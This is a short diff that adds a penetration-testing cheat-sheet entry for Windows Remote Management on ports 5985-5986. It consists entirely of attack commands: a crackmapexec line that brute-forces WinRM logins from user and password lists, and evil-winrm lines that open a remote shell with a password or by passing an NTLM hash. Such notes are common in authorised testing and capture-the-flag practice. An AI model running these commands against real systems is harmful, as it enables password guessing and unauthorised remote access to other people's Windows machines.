@@ -1,0 +1,7 @@
+# WINRM - 5985 - 5986
+# Brute force
+crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
+
+# Connecting
+evil-winrm -i <IP> -u <USER> -p <PASSWORD>
+evil-winrm -i <IP> -u <USER> -H <HASH>
